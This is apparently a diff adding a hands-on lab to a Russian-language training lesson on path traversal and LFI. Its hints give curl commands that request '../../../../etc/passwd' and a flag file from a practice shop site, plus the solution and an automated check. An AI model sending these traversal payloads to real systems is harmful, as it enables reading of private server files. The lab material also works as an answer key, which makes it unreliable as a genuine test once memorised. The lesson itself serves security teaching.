@@ -12,6 +12,18 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 45
 summary: "Как выйти за пределы каталога, прочитать файлы, использовать PHP-обёртки и подняться до RCE."
+lab:
+  kind: shell
+  title: "Практика: path traversal / LFI"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Обычный файл: `curl -s -i 'http://shop.lab.local/download?file=report.pdf'`.
+    - Выход из каталога: `curl -s 'http://shop.lab.local/download?file=../../../../etc/passwd'`.
+    - На уровень выше каталога приложения лежит `flag.txt`: `--data-urlencode 'file=../flag.txt'`.
+    - Собери и сохрани: `curl -s -G http://shop.lab.local/download --data-urlencode 'file=../flag.txt' > found.txt`, затем `check`.
 ---
 
 Представь интернет-магазин с личным кабинетом: у каждого заказа есть кнопка «скачать счёт». URL выглядит как `https://shop.local/download?file=invoice-102.pdf`. Сервер берёт имя файла и отдаёт его из папки заказов. Что будет, если вместо имени подставить `../../../../etc/passwd`? Именно этот вопрос — вход в класс **path traversal** и **LFI**.
